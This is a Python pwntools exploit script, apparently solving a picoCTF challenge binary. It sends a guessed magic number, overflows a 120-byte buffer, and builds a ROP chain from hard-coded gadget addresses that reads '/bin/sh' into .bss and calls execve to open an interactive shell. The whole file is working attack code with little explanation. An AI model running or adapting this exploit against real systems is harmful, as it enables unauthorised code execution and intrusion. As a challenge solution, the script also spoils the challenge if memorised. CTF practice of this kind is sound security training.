#!/usr/bin/env python3
from pwn import *

context.binary = ELF('./vuln')
elf = context.binary

# not used for this static exploit, but kept for parity
libc = ELF("/lib/i386-linux-gnu/libc.so.6")

REMOTE_HOST = 'shape-facility.picoctf.net'
REMOTE_PORT = 64338

# Start process
if args.REMOTE:
    p = remote(REMOTE_HOST, REMOTE_PORT)
else:
    p = process('./vuln')

# -------------------------
# Known magic sequence (you found these)
# -------------------------
# magic_number = [84, 87, 78, 16, 94]

magic_number = [84]


# sync to first prompt and win round 1
p.recvuntil(b'What number would you like to guess?\n')
p.sendline(str(magic_number[0]).encode())

# Now weâ€™re inside win(), it asks for "Name?"
p.recvuntil(b'Name? ')

# -------------------------
# Gadgets (from ROPgadget)
# -------------------------
pop_rax = 0x00000000004005af
pop_rdi = 0x00000000004006a6
pop_rsi = 0x0000000000410b93
pop_rdx = 0x0000000000410602
syscall = 0x000000000040138c

# writable memory for /bin/sh
bss = 0x6bc3a0 # confirm with readelf -S vuln (use your binary's .bss)

# -------------------------
# Build payload
# -------------------------
offset = 120

payload  = b'A' * offset

# 1) call read(0, bss, 16) to write "/bin/sh\x00" into bss
payload += p64(pop_rdi)
payload += p64(0)        # fd = stdin
payload += p64(pop_rsi)
payload += p64(bss)      # buf
payload += p64(pop_rdx)
payload += p64(16)       # count
payload += p64(elf.symbols['read'])

# 2) execve(bss, 0, 0)
payload += p64(pop_rax)
payload += p64(59)       # execve syscall number
payload += p64(pop_rdi)
payload += p64(bss)      # pointer to "/bin/sh"
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(syscall)

# -------------------------
# Send payload and /bin/sh
# -------------------------
# send the overflow payload as the Name? input
p.sendline(payload)

# send the "/bin/sh\x00" bytes that read() will consume into .bss
# use send (not sendline) to avoid extra newline if you prefer, but sendline is fine too
p.sendline(b"/bin/sh\x00")

# give process a moment (optional)
# sleep(0.1)

# Now we expect a shell
p.interactive()
